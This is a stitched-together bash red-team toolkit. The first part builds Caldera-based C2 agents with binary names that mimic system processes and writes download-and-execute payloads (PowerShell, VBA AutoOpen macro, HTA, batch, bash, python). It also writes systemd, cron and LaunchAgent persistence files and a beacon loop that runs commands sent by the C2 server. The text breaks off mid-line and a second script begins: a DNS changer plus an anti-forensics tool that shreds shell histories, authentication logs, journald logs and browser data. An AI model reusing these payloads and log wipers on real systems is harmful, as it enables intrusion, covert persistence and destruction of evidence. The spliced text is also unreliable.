        {\"name\":\"User\",\"value\":\"$user\",\"inline\":true},
        {\"name\":\"Privilege\",\"value\":\"$privilege\",\"inline\":true},
        {\"name\":\"Status\",\"value\":\"✅ Active\",\"inline\":true}
    ]"
    
    discord_rich_embed "$webhook_url" "📡 Beacon Callback" "Agent successfully connected to C2 server" "16711680" "$fields"
}

function discord_command_executed() {
    local webhook_url="$1"
    local paw="$2"
    local command="$3"
    local exit_code="$4"
    local output="$5"
    
    local status_emoji="✅"
    local color="65280"
    [[ "$exit_code" != "0" ]] && status_emoji="❌" && color="16711680"
    
    local fields="[
        {\"name\":\"PAW ID\",\"value\":\"$paw\",\"inline\":true},
        {\"name\":\"Command\",\"value\":\"$command\",\"inline\":false},
        {\"name\":\"Exit Code\",\"value\":\"$exit_code\",\"inline\":true},
        {\"name\":\"Status\",\"value\":\"$status_emoji\",\"inline\":true},
        {\"name\":\"Output\",\"value\":\"$(echo "$output" | head -c 1000)\",\"inline\":false}
    ]"
    
    discord_rich_embed "$webhook_url" "⚡ Command Executed" "Agent executed command" "$color" "$fields"
}

# Enhanced agent profile creation with more options
function create_enhanced_agent_profile() {
    echo -e "${CYAN}[*] Creating enhanced agent profile...${NC}"
    
    # Basic configuration
    read -p "C2 Server IP (default: 127.0.0.1): " c2_ip
    c2_ip=${c2_ip:-127.0.0.1}
    read -p "C2 Server Port (default: 8888): " c2_port
    c2_port=${c2_port:-8888}
    C2_HOST="http://$c2_ip:$c2_port"
    
    # Agent configuration
    echo -e "${BLUE}[*] Agent Configuration:${NC}"
    echo "1. Windows (amd64)"
    echo "2. Linux (amd64)"
    echo "3. macOS (amd64)"
    echo "4. Windows (x86)"
    echo "5. Linux (arm64)"
    echo "6. Android (arm64)"
    echo "7. Custom"
    read -p "Select platform: " platform_choice
    
    case $platform_choice in
        1) platform="windows"; arch="amd64" ;;
        2) platform="linux"; arch="amd64" ;;
        3) platform="darwin"; arch="amd64" ;;
        4) platform="windows"; arch="386" ;;
        5) platform="linux"; arch="arm64" ;;
        6) platform="android"; arch="arm64" ;;
        7) 
            read -p "Enter platform: " platform
            read -p "Enter architecture: " arch
            ;;
        *) platform="linux"; arch="amd64" ;;
    esac
    
    read -p "Hostname (default: auto-detect): " host
    host=${host:-$(hostname)}
    read -p "Group (red/blue/default): " group
    group=${group:-red}
    read -p "Username (default: auto-detect): " username
    username=${username:-$(whoami)}
    
    # Advanced configuration
    echo -e "${BLUE}[*] Advanced Configuration:${NC}"
    read -p "Executors (bash,sh,cmd,powershell,python): " executors
    executors=${executors:-bash,sh}
    read -p "Privilege level (User/Elevated): " privilege
    privilege=${privilege:-User}
    read -p "Sleep interval (seconds, default: 60): " sleep_interval
    sleep_interval=${sleep_interval:-60}
    read -p "Jitter (0.0-1.0, default: 0.25): " jitter
    jitter=${jitter:-0.25}
    read -p "Contact method (http,tcp,udp,websocket,dns): " contact
    contact=${contact:-http}
    
    # Stealth options
    echo -e "${BLUE}[*] Stealth Options:${NC}"
    read -p "Enable process masquerading? (y/n): " masquerade
    read -p "Custom process name (leave blank for default): " proc_name
    read -p "Enable anti-forensics? (y/n): " anti_forensics
    read -p "Enable self-destruct timer? (minutes, 0=disabled): " self_destruct
    self_destruct=${self_destruct:-0}
    
    # Communication options
    echo -e "${BLUE}[*] Communication Options:${NC}"
    read -p "Discord webhook URL (optional): " discord_webhook
    read -p "Slack webhook URL (optional): " slack_webhook
    read -p "Telegram bot token (optional): " telegram_token
    read -p "Telegram chat ID (optional): " telegram_chat
    
    # Generate unique PAW ID
    local paw_id="redops-$(date +%s)-$(openssl rand -hex 4)"
    
    # Create profile JSON
    cat > "$AGENT_PROFILE" << EOF
{
  "server": "$C2_HOST",
  "platform": "$platform",
  "architecture": "$arch",
  "host": "$host",
  "group": "$group",
  "username": "$username",
  "paw": "$paw_id",
  "executors": [$(echo "$executors" | sed 's/,/","/g;s/^/"/;s/$/"/')],
  "privilege": "$privilege",
  "sleep": $sleep_interval,
  "jitter": $jitter,
  "contact": "$contact",
  "pid": $,
  "ppid": $PPID,
  "location": "$(pwd)",
  "exe_name": "$proc_name",
  "host_ip_addrs": ["$(hostname -I | awk '{print $1}')"],
  "deadman_enabled": $([ "$self_destruct" -gt 0 ] && echo "true" || echo "false"),
  "deadman_timer": $self_destruct,
  "masquerade": "$([ "$masquerade" = "y" ] && echo "true" || echo "false")",
  "anti_forensics": "$([ "$anti_forensics" = "y" ] && echo "true" || echo "false")",
  "discord_webhook": "$discord_webhook",
  "slack_webhook": "$slack_webhook",
  "telegram_token": "$telegram_token",
  "telegram_chat": "$telegram_chat",
  "created": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
}
EOF
    
    log_action "SUCCESS" "Enhanced agent profile created: $AGENT_PROFILE"
    echo -e "${GREEN}[+] Profile PAW ID: $paw_id${NC}"
    
    # Send creation notification
    if [[ -n "$discord_webhook" ]]; then
        local fields="[{\"name\":\"PAW ID\",\"value\":\"$paw_id\",\"inline\":true},{\"name\":\"Platform\",\"value\":\"$platform/$arch\",\"inline\":true},{\"name\":\"Group\",\"value\":\"$group\",\"inline\":true}]"
        discord_rich_embed "$discord_webhook" "🛠️ Agent Profile Created" "New agent profile configured and ready for deployment" "255" "$fields"
    fi
}

# Multi-platform agent builder with advanced features
function build_enhanced_agents() {
    echo -e "${CYAN}[*] Building enhanced multi-platform agents...${NC}"
    
    if [[ ! -f "$AGENT_PROFILE" ]]; then
        echo -e "${RED}[!] Agent profile not found. Create one first.${NC}"
        return 1
    fi
    
    # Load profile
    local server=$(jq -r '.server' "$AGENT_PROFILE")
    local platform=$(jq -r '.platform' "$AGENT_PROFILE")
    local arch=$(jq -r '.architecture' "$AGENT_PROFILE")
    local contact=$(jq -r '.contact' "$AGENT_PROFILE")
    local masquerade=$(jq -r '.masquerade' "$AGENT_PROFILE")
    local anti_forensics=$(jq -r '.anti_forensics' "$AGENT_PROFILE")
    local paw_id=$(jq -r '.paw' "$AGENT_PROFILE")
    
    log_action "INFO" "Building agent for $platform/$arch with $contact contact"
    
    # Prepare build environment
    if [[ ! -d "$AGENT_DIR" ]]; then
        echo -e "${RED}[!] Caldera agent directory not found: $AGENT_DIR${NC}"
        echo -e "${YELLOW}[*] Attempting to download Sandcat agent...${NC}"
        mkdir -p "$AGENT_DIR"
        curl -s -L "https://raw.githubusercontent.com/mitre/sandcat/master/gocat/sandcat.go" -o "$AGENT_DIR/sandcat.go"
    fi
    
    cd "$AGENT_DIR" || return 1
    
    # Customize agent source
    cp sandcat.go "sandcat_$paw_id.go"
    
    # Inject custom configurations
    sed -i "s|server := \".*\"|server := \"$server\"|" "sandcat_$paw_id.go"
    sed -i "s|contact := \".*\"|contact := \"$contact\"|" "sandcat_$paw_id.go"
    
    # Add stealth features
    if [[ "$masquerade" == "true" ]]; then
        log_action "INFO" "Adding process masquerading..."
        # Add process name spoofing code
    fi
    
    if [[ "$anti_forensics" == "true" ]]; then
        log_action "INFO" "Adding anti-forensics features..."
        # Add log clearing and artifact removal
    fi
    
    # Build flags
    local build_flags="-ldflags='-s -w'"
    local output_name="agent"
    
    case $platform in
        "windows")
            build_flags="$build_flags -H=windowsgui"
            case $arch in
                "amd64") output_name="svchost.exe" ;;
                "386") output_name="winlogon.exe" ;;
            esac
            ;;
        "linux")
            case $arch in
                "amd64") output_name=".systemd-networkd" ;;
                "arm64") output_name=".dbus-daemon" ;;
            esac
            ;;
        "darwin")
            output_name="Microsoft Office Updater"
            ;;
        "android")
            output_name="com.android.systemui"
            ;;
    esac
    
    # Build agent
    log_action "INFO" "Compiling agent: $output_name"
    GOOS=$platform GOARCH=$arch go build $build_flags -o "$OUTPUT_DIR/$output_name" "sandcat_$paw_id.go"
    
    if [[ $? -eq 0 ]]; then
        # Post-processing
        if [[ "$platform" == "linux" ]] && command -v strip &> /dev/null; then
            strip --strip-all "$OUTPUT_DIR/$output_name"
        fi
        
        if [[ "$PACKER" == "true" ]] && [[ "$platform" == "windows" ]]; then
            upx --best "$OUTPUT_DIR/$output_name" 2>/dev/null
        fi
        
        # Calculate file info
        local file_size=$(stat -c%s "$OUTPUT_DIR/$output_name" 2>/dev/null || stat -f%z "$OUTPUT_DIR/$output_name")
        local file_hash=$(sha256sum "$OUTPUT_DIR/$output_name" | cut -d' ' -f1)
        
        log_action "SUCCESS" "Agent built: $OUTPUT_DIR/$output_name ($file_size bytes)"
        log_action "INFO" "SHA256: $file_hash"
        
        # Send Discord notification
        local discord_webhook=$(jq -r '.discord_webhook' "$AGENT_PROFILE")
        if [[ -n "$discord_webhook" ]] && [[ "$discord_webhook" != "null" ]]; then
            discord_agent_deployed "$discord_webhook" "$platform/$arch" "$output_name" "$(numfmt --to=iec $file_size)" "$file_hash"
        fi
        
        # Generate delivery methods
        generate_delivery_methods "$platform" "$output_name" "$file_size"
        
    else
        log_action "ERROR" "Failed to build agent for $platform/$arch"
        return 1
    fi
    
    # Cleanup
    rm -f "sandcat_$paw_id.go"
    cd "$CURRENT_DIR"
    
    return 0
}

# Enhanced delivery method generation
function generate_delivery_methods() {
    local platform="$1"
    local filename="$2"
    local filesize="$3"
    local c2_ip=$(jq -r '.server' "$AGENT_PROFILE" | sed 's|http://||' | cut -d: -f1)
    
    local delivery_dir="$HOME/redops_payloads/delivery_methods"
    mkdir -p "$delivery_dir"
    
    log_action "INFO" "Generating delivery methods for $platform"
    
    case $platform in
        "windows")
            # PowerShell one-liner
            cat > "$delivery_dir/powershell_download.ps1" << EOF
# PowerShell Download and Execute
\$url = "http://$c2_ip:8080/$filename"
\$path = "\$env:TEMP\\$filename"
(New-Object Net.WebClient).DownloadFile(\$url, \$path)
Start-Process \$path -WindowStyle Hidden
EOF
            
            # VBA Macro
            cat > "$delivery_dir/vba_macro.vba" << EOF
Sub AutoOpen()
    Dim url As String, path As String
    url = "http://$c2_ip:8080/$filename"
    path = Environ("TEMP") & "\\$filename"
    
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    
    If http.Status = 200 Then
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile path, 2
        stream.Close
        
        Shell path, vbHide
    End If
End Sub
EOF
            
            # Batch file
            cat > "$delivery_dir/download.bat" << EOF
@echo off
curl -s -o %TEMP%\\$filename http://$c2_ip:8080/$filename
start /b %TEMP%\\$filename
EOF
            
            # HTA application
            cat > "$delivery_dir/payload.hta" << EOF
<html>
<head>
<HTA:APPLICATION id="app" border="no" borderStyle="normal" caption="no" 
maximizeButton="no" minimizeButton="no" showInTaskbar="no" windowState="minimize">
<script type="text/vbscript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('http://$c2_ip:8080/$filename','\$env:TEMP\\$filename'); Start-Process '\$env:TEMP\\$filename' -WindowStyle Hidden""", 0, False
    window.close()
</script>
</head>
<body></body>
</html>
EOF
            ;;
            
        "linux")
            # Bash one-liner
            cat > "$delivery_dir/bash_download.sh" << EOF
#!/bin/bash
# Linux Download and Execute
curl -s -o /tmp/.$filename http://$c2_ip:8080/$filename
chmod +x /tmp/.$filename
nohup /tmp/.$filename > /dev/null 2>&1 &
EOF
            
            # Python downloader
            cat > "$delivery_dir/python_download.py" << EOF
#!/usr/bin/env python3
import urllib.request
import os
import subprocess
import tempfile

url = "http://$c2_ip:8080/$filename"
temp_path = os.path.join(tempfile.gettempdir(), ".$filename")

urllib.request.urlretrieve(url, temp_path)
os.chmod(temp_path, 0o755)
subprocess.Popen([temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
EOF
            
            # Systemd service persistence
            cat > "$delivery_dir/systemd_service.service" << EOF
[Unit]
Description=System Network Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/$filename
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
            
            # Cron job persistence
            cat > "$delivery_dir/cron_persistence.sh" << EOF
#!/bin/bash
# Add to crontab for persistence
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.$filename") | crontab -
EOF
            ;;
            
        "darwin")
            # macOS LaunchAgent
            cat > "$delivery_dir/launch_agent.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.microsoft.office.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/$filename</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
            ;;
    esac
    
    log_action "SUCCESS" "Delivery methods generated in $delivery_dir"
}

# Advanced beacon with enhanced features
function enhanced_beacon_to_c2() {
    echo -e "${CYAN}[*] Enhanced beaconing to C2...${NC}"
    
    if [[ ! -f "$AGENT_PROFILE" ]]; then
        echo -e "${RED}[!] Agent profile not found${NC}"
        return 1
    fi
    
    # Load profile
    local server=$(jq -r '.server' "$AGENT_PROFILE")
    local paw_id=$(jq -r '.paw' "$AGENT_PROFILE")
    local sleep_interval=$(jq -r '.sleep' "$AGENT_PROFILE")
    local jitter=$(jq -r '.jitter' "$AGENT_PROFILE")
    
    # Calculate jittered sleep
    local jitter_amount=$(echo "$sleep_interval * $jitter" | bc -l)
    local min_sleep=$(echo "$sleep_interval - $jitter_amount" | bc -l | cut -d. -f1)
    local max_sleep=$(echo "$sleep_interval + $jitter_amount" | bc -l | cut -d. -f1)
    local actual_sleep=$((RANDOM % (max_sleep - min_sleep + 1) + min_sleep))
    
    # Prepare beacon data
    local profile_b64=$(cat "$AGENT_PROFILE" | base64 -w 0)
    
    # Send beacon
    log_action "INFO" "Sending beacon to $server (PAW: $paw_id)"
    local response=$(curl -s -m 30 -X POST -d "$profile_b64" "$server/beacon")
    
    if [[ $? -eq 0 ]] && [[ -n "$response" ]]; then
        # Parse response
        local decoded_response=$(echo "$response" | base64 -d 2>/dev/null)
        
        if [[ -n "$decoded_response" ]]; then
            echo "$decoded_response" > /tmp/beacon_response.json
            
            # Extract beacon data
            local new_sleep=$(echo "$decoded_response" | jq -r '.sleep // empty')
            local watchdog=$(echo "$decoded_response" | jq -r '.watchdog // empty')
            local instructions=$(echo "$decoded_response" | jq -r '.instructions // empty')
            
            [[ -n "$new_sleep" ]] && sleep_interval="$new_sleep"
            [[ -n "$watchdog" ]] && WATCHDOG="$watchdog"
            
            log_action "SUCCESS" "Beacon successful - Sleep: ${sleep_interval}s, Watchdog: ${WATCHDOG}s"
            
            # Discord notification
            local discord_webhook=$(jq -r '.discord_webhook' "$AGENT_PROFILE")
            if [[ -n "$discord_webhook" ]] && [[ "$discord_webhook" != "null" ]]; then
                local platform=$(jq -r '.platform' "$AGENT_PROFILE")
                local host_ip=$(jq -r '.host_ip_addrs[0]' "$AGENT_PROFILE")
                local username=$(jq -r '.username' "$AGENT_PROFILE")
                local privilege=$(jq -r '.privilege' "$AGENT_PROFILE")
                
                discord_beacon_callback "$discord_webhook" "$paw_id" "$platform" "$host_ip" "$username" "$privilege"
            fi
            
            # Process instructions if any
            if [[ "$instructions" != "null" ]] && [[ "$instructions" != "empty" ]] && [[ -n "$instructions" ]]; then
                log_action "INFO" "Processing $(echo "$instructions" | jq length) instructions"
                enhanced_execute_instructions "$instructions"
            fi
            
        else
            log_action "WARNING" "Invalid beacon response format"
        fi
    else
        log_action "ERROR" "Beacon failed - no response from C2"
        return 1
    fi
    
    log_action "INFO" "Next beacon in ${actual_sleep}s (jittered from ${sleep_interval}s)"
    return 0
}

# Enhanced instruction execution with advanced features
function enhanced_execute_instructions() {
    local instructions="$1"
    
    if [[ -z "$instructions" ]] || [[ "$instructions" == "null" ]]; then
        log_action "WARNING" "No instructions to execute"
        return 0
    fi
    
    echo "$instructions" > /tmp/instructions.json
    local num_instructions=$(jq length /tmp/instructions.json)
    
    log_action "INFO" "Executing $num_instructions instructions"
    
    for ((i=0; i<num_instructions; i++)); do
        local instr=$(jq ".[$i]" /tmp/instructions.json)
        local id=$(echo "$instr" | jq -r '.id')
        local sleep_time=$(echo "$instr" | jq -r '.sleep')
        local cmd_b64=$(echo "$instr" | jq -r '.command')
        local executor=$(echo "$instr" | jq -r '.executor')
        local timeout=$(echo "$instr" | jq -r '.timeout')
        local payload=$(echo "$instr" | jq -r '.payload // empty')
        local uploads=$(echo "$instr" | jq -r '.uploads[]? // empty')
        
        # Decode command
        local cmd=$(echo "$cmd_b# ============================================================================
#                         DNS CHANGER & ANTI-FORENSICS TOOLS
# ============================================================================

install_dns_changer() {
    log "INFO" "Installing DNS Changer Eye..."
    
    local dns_changer_script="$TOOLS_DIR/dns_changer_eye.py"
    
    cat > "$dns_changer_script" << 'EOF'
#!/usr/bin/env python3
# DNS Changer Eye - Enhanced Version
# Original Author: Jolanda de Koff aka Bulls Eye
# Enhanced for Ultimate Red Team Automation

import os
import random
import time
import sys
import json
from datetime import datetime

class DNSChangerEye:
    def __init__(self):
        self.dns_servers = [
            # Cloudflare
            ("1.1.1.1", "1.0.0.1", "Cloudflare"),
            # Quad9
            ("9.9.9.9", "149.112.112.112", "Quad9"),
            # OpenDNS
            ("208.67.222.222", "208.67.220.220", "OpenDNS"),
            # Verisign
            ("64.6.64.6", "64.6.65.6", "Verisign"),
            # UncensoredDNS
            ("91.239.100.100", "89.233.43.71", "UncensoredDNS"),
            # CleanBrowsing
            ("185.228.168.9", "185.228.169.9", "CleanBrowsing"),
            # Yandex
            ("77.88.8.8", "77.88.8.1", "Yandex"),
            # AdGuard
            ("176.103.130.130", "176.103.130.131", "AdGuard"),
            # Neustar
            ("156.154.70.1", "156.154.71.1", "Neustar"),
            # Norton
            ("199.85.126.10", "199.85.127.10", "Norton"),
            # DNS.WATCH
            ("84.200.69.80", "84.200.70.40", "DNS.WATCH"),
            # Comodo
            ("8.26.56.26", "8.20.247.20", "Comodo"),
            # Level3
            ("209.244.0.3", "209.244.0.4", "Level3"),
            # SafeDNS
            ("195.46.39.39", "195.46.39.40", "SafeDNS"),
        ]
        
        self.log_file = "/var/log/dns_changer.log"
        self.config_file = "/etc/dns_changer_config.json"
        self.original_resolv = "/etc/resolv.conf.original"
    
    def banner(self):
        print(""" \033[1;34m
 ____  _   _ ____    ____ _                               _____           
|  _ \| \ | / ___|  / ___| |__   __ _ _ __   __ _  ___ _ _| ____|_   _  ___ 
| | | |  \| \___ \ | |   | '_ \ / _` | '_ \ / _` |/ _ \ '__|  _| | | |/ _ \\
| |_| | |\  |___) || |___| | | | (_| | | | | (_| |  __/ |  | |___| |_| |  __/
|____/|_| \_|____/  \____|_| |_|\__,_|_| |_|\__, |\___|_|  |_____|\__, |\___|
                                            |___/                 |___/      
        \033[1;m
        \033[34mDNS Changer Eye - Enhanced Version\033[0m
        \033[34mOriginal Author: Jolanda de Koff aka Bulls Eye\033[0m
        \033[34mEnhanced for Ultimate Red Team Automation\033[0m
        """)
    
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        try:
            with open(self.log_file, "a") as f:
                f.write(log_entry)
        except PermissionError:
            print(f"Warning: Cannot write to log file {self.log_file}")
        
        print(f"[{timestamp}] {message}")
    
    def backup_original_dns(self):
        if not os.path.exists(self.original_resolv):
            try:
                os.system(f"cp /etc/resolv.conf {self.original_resolv}")
                self.log("Original DNS configuration backed up")
            except Exception as e:
                self.log(f"Error backing up DNS config: {e}")
    
    def restore_original_dns(self):
        if os.path.exists(self.original_resolv):
            try:
                os.system(f"cp {self.original_resolv} /etc/resolv.conf")
                self.log("Original DNS configuration restored")
                return True
            except Exception as e:
                self.log(f"Error restoring DNS config: {e}")
                return False
        else:
            self.log("No backup found, cannot restore original DNS")
            return False
    
    def change_dns(self, dns1, dns2, provider):
        try:
            dns_config = f"nameserver {dns1}\nnameserver {dns2}\n"
            with open("/etc/resolv.conf", "w") as f:
                f.write(dns_config)
            
            self.log(f"DNS changed to {provider}: {dns1}, {dns2}")
            return True
        except PermissionError:
            self.log("Error: Permission denied. Run as root.")
            return False
        except Exception as e:
            self.log(f"Error changing DNS: {e}")
            return False
    
    def test_dns(self, dns_server):
        """Test DNS server response time"""
        import subprocess
        try:
            result = subprocess.run(
                ["dig", "@" + dns_server, "google.com", "+time=2"],
                capture_output=True, text=True, timeout=5
            )
            if "ANSWER SECTION" in result.stdout:
                return True
        except:
            pass
        return False
    
    def get_fastest_dns(self):
        """Find the fastest responding DNS servers"""
        self.log("Testing DNS servers for fastest response...")
        working_servers = []
        
        for dns1, dns2, provider in self.dns_servers:
            if self.test_dns(dns1):
                working_servers.append((dns1, dns2, provider))
                self.log(f"{provider} ({dns1}) - Working")
            else:
                self.log(f"{provider} ({dns1}) - Not responding")
        
        if working_servers:
            return random.choice(working_servers)
        else:
            self.log("No working DNS servers found, using Cloudflare as fallback")
            return ("1.1.1.1", "1.0.0.1", "Cloudflare")
    
    def continuous_change(self, interval=300):
        """Continuously change DNS servers"""
        self.log(f"Starting continuous DNS rotation every {interval} seconds")
        self.backup_original_dns()
        
        try:
            while True:
                dns1, dns2, provider = self.get_fastest_dns()
                self.change_dns(dns1, dns2, provider)
                time.sleep(interval)
        except KeyboardInterrupt:
            self.log("DNS rotation stopped by user")
            choice = input("Restore original DNS? (y/n): ").lower()
            if choice == 'y':
                self.restore_original_dns()
    
    def manual_change(self):
        """Manual DNS change with provider selection"""
        print("\nAvailable DNS Providers:")
        for i, (dns1, dns2, provider) in enumerate(self.dns_servers):
            print(f"{i+1}. {provider} ({dns1}, {dns2})")
        
        try:
            choice = int(input("\nSelect provider (number): ")) - 1
            if 0 <= choice < len(self.dns_servers):
                dns1, dns2, provider = self.dns_servers[choice]
                self.backup_original_dns()
                if self.change_dns(dns1, dns2, provider):
                    print(f"DNS successfully changed to {provider}")
                else:
                    print("Failed to change DNS")
            else:
                print("Invalid selection")
        except ValueError:
            print("Invalid input")
    
    def show_current_dns(self):
        """Display current DNS configuration"""
        try:
            with open("/etc/resolv.conf", "r") as f:
                content = f.read()
            
            print("\nCurrent DNS Configuration:")
            print("-" * 30)
            print(content)
        except Exception as e:
            print(f"Error reading DNS config: {e}")
    
    def run(self):
        if os.geteuid() != 0:
            print("Error: This script requires root privileges")
            sys.exit(1)
        
        self.banner()
        
        while True:
            print("\n" + "="*50)
            print("DNS Changer Eye Options:")
            print("1. Manual DNS Change")
            print("2. Continuous DNS Rotation")
            print("3. Use Fastest DNS")
            print("4. Show Current DNS")
            print("5. Restore Original DNS")
            print("6. Exit")
            print("="*50)
            
            choice = input("Select option: ").strip()
            
            if choice == "1":
                self.manual_change()
            elif choice == "2":
                try:
                    interval = int(input("Enter rotation interval (seconds, default 300): ") or "300")
                    self.continuous_change(interval)
                except ValueError:
                    print("Invalid interval, using default 300 seconds")
                    self.continuous_change()
            elif choice == "3":
                dns1, dns2, provider = self.get_fastest_dns()
                self.backup_original_dns()
                self.change_dns(dns1, dns2, provider)
                print(f"DNS set to fastest provider: {provider}")
            elif choice == "4":
                self.show_current_dns()
            elif choice == "5":
                self.restore_original_dns()
            elif choice == "6":
                print("Exiting DNS Changer Eye")
                break
            else:
                print("Invalid option")

if __name__ == "__main__":
    dns_changer = DNSChangerEye()
    dns_changer.run()
EOF
    
    chmod +x "$dns_changer_script"
    log "SUCCESS" "DNS Changer Eye installed at $dns_changer_script"
}

install_cleartracks() {
    log "INFO" "Installing ClearTracks Anti-Forensics Tool..."
    
    local cleartracks_script="$TOOLS_DIR/cleartracks.sh"
    
    cat > "$cleartracks_script" << 'EOF'
#!/bin/bash
# ClearTracks v2.1 - Enhanced Linux Anti-Forensics & Log Cleaner
# Original Author: Kdairatchi x GPT
# Enhanced for Ultimate Red Team Automation

# Configuration
LOGFILE="/var/log/cleartracks.log"
SHRED_ITERATIONS=7  # Gutmann method default
PARANOID=false
STEALTH=false
SELECTIVE=false

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Check root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root${NC}" 
   exit 1
fi

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --paranoid)
            PARANOID=true
            SHRED_ITERATIONS=35  # Gutmann maximum
            shift
            ;;
        --stealth)
            STEALTH=true
            shift
            ;;
        --selective)
            SELECTIVE=true
            shift
            ;;
        --help)
            show_help
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${NC}"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

function show_help() {
    cat << EOF
ClearTracks v2.1 - Enhanced Anti-Forensics Tool

Usage: $0 [OPTIONS]

OPTIONS:
    --paranoid    Use maximum security (35 shred iterations, overwrite free space)
    --stealth     Run silently and self-destruct after completion
    --selective   Interactive mode to select specific cleanup operations
    --help        Show this help message

EXAMPLES:
    $0                    # Standard cleanup
    $0 --paranoid         # Maximum security cleanup
    $0 --stealth          # Silent operation with self-destruct
    $0 --selective        # Choose specific cleanup operations

WARNING: This tool will permanently delete system logs and traces.
Use only on authorized systems for legitimate security testing.
EOF
}

function log() {
    if ! $STEALTH; then
        echo -e "$1"
    fi
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOGFILE" 2>/dev/null
}

function show_banner() {
    if ! $STEALTH; then
        echo -e "${RED}"
        cat << "EOF"
   _____ _                    _______             _        ___  _ 
  / ____| |                  |__   __|           | |      |__ \/ |
 | |    | | ___  __ _ _ __ _ __| |_ __ __ _  ___| | _____   ) | |
 | |    | |/ _ \/ _` | '__| '__| | '__/ _` |/ __| |/ / __| / /| |
 | |____| |  __/ (_| | |  | |  | | | | (_| | (__|   <\__ \/ /_| |
  \_____|_|\___|\__,_|_|  |_|  |_|_|  \__,_|\___|_|\_\___/____| |
                                                              |_|
Enhanced Anti-Forensics & Log Cleaner
EOF
        echo -e "${NC}"
    fi
}

function confirm_operation() {
    if $STEALTH; then
        return 0
    fi
    
    echo -e "${YELLOW}[!] WARNING: This operation will permanently delete system traces${NC}"
    echo -e "${YELLOW}[!] Current mode: Paranoid=$PARANOID, Stealth=$STEALTH, Selective=$SELECTIVE${NC}"
    echo -e "${YELLOW}[!] Shred iterations: $SHRED_ITERATIONS${NC}"
    
    read -p "Continue? (y/N): " confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] Operation cancelled${NC}"
        exit 0
    fi
}

function secure_delete() {
    local file="$1"
    if [[ -f "$file" ]]; then
        shred -u -n $SHRED_ITERATIONS "$file" 2>/dev/null
    elif [[ -d "$file" ]]; then
        find "$file" -type f -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
        rm -rf "$file" 2>/dev/null
    fi
}

function clear_bash_history() {
    log "${BLUE}[*] Clearing bash history...${NC}"
    
    # Find and securely delete all bash history files
    find /home -name '.bash_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /root -name '.bash_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # Clear other shell histories
    find /home -name '.zsh_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /home -name '.fish_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /root -name '.zsh_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # Clear current session history
    history -c
    history -w
    
    # Disable history for current session
    export HISTFILE=/dev/null
    export HISTSIZE=0
    export HISTFILESIZE=0
    
    # Alternative method - link to /dev/null
    for user_home in /home/* /root; do
        [[ -d "$user_home" ]] && ln -sf /dev/null "$user_home/.bash_history" 2>/dev/null
    done
    
    log "${GREEN}[+] Bash history cleared${NC}"
}

function clear_system_logs() {
    log "${BLUE}[*] Clearing system logs...${NC}"
    
    # Authentication logs
    for logfile in /var/log/auth.log* /var/log/secure* /var/log/faillog /var/log/tallylog; do
        [[ -f "$logfile" ]] && secure_delete "$logfile"
    done
    
    # System logs
    for logfile in /var/log/syslog* /var/log/messages* /var/log/kern.log* /var/log/dmesg*; do
        [[ -f "$logfile" ]] && secure_delete "$logfile"
    done
    
    # Application logs
    secure_delete "/var/log/apache2"
    secure_delete "/var/log/nginx"
    secure_delete "/var/log/mysql"
    secure_delete "/var/log/postgresql"
    secure_delete "/var/log/redis"
    
    # Boot logs
    secure_delete "/var/log/boot.log"
    secure_delete "/var/log/bootlog"
    
    # Package manager logs
    secure_delete "/var/log/apt"
    secure_delete "/var/log/yum.log"
    secure_delete "/var/log/dnf.log"
    secure_delete "/var/log/dpkg.log"
    
    # Journald logs
    if command -v journalctl &> /dev/null; then
        journalctl --flush
        journalctl --rotate
        journalctl --vacuum-time=1s
        secure_delete "/var/log/journal"
    fi
    
    # User activity logs
    secure_delete "/var/log/wtmp"
    secure_delete "/var/log/btmp"
    secure_delete "/var/log/lastlog"
    secure_delete "/var/log/utmp"
    
    # Recreate essential log files
    touch /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/utmp
    chmod 660 /var/log/wtmp /var/log/btmp /var/log/lastlog
    chmod 644 /var/log/utmp
    
    log "${GREEN}[+] System logs cleared${NC}"
}

function clear_application_traces() {
    log "${BLUE}[*] Clearing application traces...${NC}"
    
    # Browser data
    for user_home in /home/*; do
        [[ -d "$user_home" ]] || continue
        
        # Firefox
        secure_delete "$user_home/.mozilla/firefox/*/places.sqlite"
        secure_delete "$user_home/.mozilla/firefox/*/cookies.sqlite"
